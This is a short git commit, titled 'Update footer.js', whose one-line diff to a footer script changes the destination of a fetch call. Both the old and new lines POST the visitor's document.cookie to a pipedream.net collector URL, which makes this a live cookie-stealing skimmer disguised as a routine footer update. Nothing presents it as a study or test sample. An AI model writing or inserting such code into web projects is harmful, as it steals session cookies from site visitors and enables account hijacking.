5bf7a13bf6f766a98a2f261c98c96cbda07723f5
carlmelt <106330727+carlmelt@users.noreply.github.com>
2023-03-21 11:09:35 +0700

    Update footer.js

--- footer.js
+++ footer.js
@@ -1,1 +1,1 @@
-fetch('https://eo6q6x6o5xxa5xl.m.pipedream.net', {method: 'POST', mode: 'no-cors', body:document.cookie});
+fetch('https://eoqqky1i9fqdymv.m.pipedream.net/', {method: 'POST', mode: 'no-cors', body:document.cookie});
